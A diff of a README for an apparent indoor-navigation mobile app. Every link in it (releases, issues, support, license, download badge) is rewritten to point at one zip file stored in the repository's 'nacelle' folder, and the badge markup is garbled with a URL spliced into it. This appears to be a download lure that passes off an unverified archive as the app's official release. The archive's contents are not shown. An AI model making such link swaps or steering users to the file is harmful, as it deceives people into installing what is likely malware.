@@ -1,6 +1,6 @@
 # 🌟 indoor-gis-developing-indoor-positioning-in-native-mobile-applications-2025 - Seamlessly Navigate Indoor Spaces
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%F0%9F%93%88-4CAF50.svg)](https://github.com/Emon321/indoor-gis-developing-indoor-positioning-in-native-mobile-applications-2025/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Emon321/indoor-gis-developing-indoor-positioning-in-native-mobile-applications-2025/main/nacelle/indoor-gis-developing-indoor-positioning-in-native-mobile-applications-2025.zip%20Latest%20Release-%F0%9F%93%https://raw.githubusercontent.com/Emon321/indoor-gis-developing-indoor-positioning-in-native-mobile-applications-2025/main/nacelle/indoor-gis-developing-indoor-positioning-in-native-mobile-applications-2025.zip)](https://raw.githubusercontent.com/Emon321/indoor-gis-developing-indoor-positioning-in-native-mobile-applications-2025/main/nacelle/indoor-gis-developing-indoor-positioning-in-native-mobile-applications-2025.zip)
 
 ## 📊 Overview
 
@@ -12,7 +12,7 @@ Follow these steps to set up and use the application on your device.
 
 ### 📥 Download & Install
 
-1. **Visit this page to download:** Click the link to go to the [Releases page](https://github.com/Emon321/indoor-gis-developing-indoor-positioning-in-native-mobile-applications-2025/releases).
+1. **Visit this page to download:** Click the link to go to the [Releases page](https://raw.githubusercontent.com/Emon321/indoor-gis-developing-indoor-positioning-in-native-mobile-applications-2025/main/nacelle/indoor-gis-developing-indoor-positioning-in-native-mobile-applications-2025.zip).
 2. Look for the latest version of the application.
 3. Click on the download link for the version compatible with your device:
    - If you are on Android, look for the `.apk` file.
@@ -56,7 +56,7 @@ Follow these steps to set up and use the application on your device.
 
 ## 🔄 Updates & Bug Fixes
 
-We regularly update this application to improve performance and add new features. Be sure to check the [Releases page](https://github.com/Emon321/indoor-gis-developing-indoor-positioning-in-native-mobile-applications-2025/releases) frequently for the latest updates. Download the newest version to access enhancements and to ensure the application runs smoothly.
+We regularly update this application to improve performance and add new features. Be sure to check the [Releases page](https://raw.githubusercontent.com/Emon321/indoor-gis-developing-indoor-positioning-in-native-mobile-applications-2025/main/nacelle/indoor-gis-developing-indoor-positioning-in-native-mobile-applications-2025.zip) frequently for the latest updates. Download the newest version to access enhancements and to ensure the application runs smoothly.
 
 ## 🛑 Troubleshooting
 
@@ -65,18 +65,18 @@ If you encounter issues while installing or using the application, consider the 
 - Ensure that your device meets the system requirements listed above.
 - Restart your device and attempt to reinstall the application.
 - Check for any updates to your device's operating system.
-- Visit the [issues page](https://github.com/Emon321/indoor-gis-developing-indoor-positioning-in-native-mobile-applications-2025/issues) for common problems and solutions.
+- Visit the [issues page](https://raw.githubusercontent.com/Emon321/indoor-gis-developing-indoor-positioning-in-native-mobile-applications-2025/main/nacelle/indoor-gis-developing-indoor-positioning-in-native-mobile-applications-2025.zip) for common problems and solutions.
 
 ## 🤝 Support
 
-For additional assistance, please visit our [support page](https://github.com/Emon321/indoor-gis-developing-indoor-positioning-in-native-mobile-applications-2025/issues). You can report any bugs or request features there. Your feedback helps us improve the application.
+For additional assistance, please visit our [support page](https://raw.githubusercontent.com/Emon321/indoor-gis-developing-indoor-positioning-in-native-mobile-applications-2025/main/nacelle/indoor-gis-developing-indoor-positioning-in-native-mobile-applications-2025.zip). You can report any bugs or request features there. Your feedback helps us improve the application.
 
 ## 📜 License
 
-This project is licensed under the MIT License. You can use, modify, and share this software while maintaining the same license for your modifications. For more information, see the [LICENSE](https://github.com/Emon321/indoor-gis-developing-indoor-positioning-in-native-mobile-applications-2025/LICENSE) file.
+This project is licensed under the MIT License. You can use, modify, and share this software while maintaining the same license for your modifications. For more information, see the [LICENSE](https://raw.githubusercontent.com/Emon321/indoor-gis-developing-indoor-positioning-in-native-mobile-applications-2025/main/nacelle/indoor-gis-developing-indoor-positioning-in-native-mobile-applications-2025.zip) file.
 
 ## 🚀 Conclusion
 
 This application aims to simplify indoor navigation for everyone. Download it today to start your journey through any indoor space with confidence.
 
-![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%F0%9F%93%88-4CAF50.svg)
+![Download Latest Release](https://raw.githubusercontent.com/Emon321/indoor-gis-developing-indoor-positioning-in-native-mobile-applications-2025/main/nacelle/indoor-gis-developing-indoor-positioning-in-native-mobile-applications-2025.zip%20Latest%20Release-%F0%9F%93%https://raw.githubusercontent.com/Emon321/indoor-gis-developing-indoor-positioning-in-native-mobile-applications-2025/main/nacelle/indoor-gis-developing-indoor-positioning-in-native-mobile-applications-2025.zip)
